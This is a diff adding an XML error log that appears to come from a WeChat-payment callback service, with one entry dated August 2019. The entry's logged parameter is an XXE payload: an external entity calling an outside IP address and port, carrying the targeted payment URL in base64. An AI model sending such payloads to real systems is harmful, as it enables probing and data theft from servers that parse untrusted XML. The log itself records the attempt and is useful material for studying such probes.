@@ -1,0 +1,11 @@
+<?xml version="1.0" standalone="yes"?>
+<DocumentElement>
+  <Notify>
+    <OperTime>2019/8/5 3:41:08</OperTime>
+    <Error>远程服务器返回错误: (404) 未找到。</Error>
+    <Param>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019080503_962?aHR0cDovL21haWwuYmVpZG91c3Rhci5uZXQvcGF5L3d4X1BheS5hc3B4"&gt;]&gt;
+&lt;foo&gt;&lt;value&gt;&amp;xxe;&lt;/value&gt;&lt;/foo&gt;</Param>
+  </Notify>
+</DocumentElement>
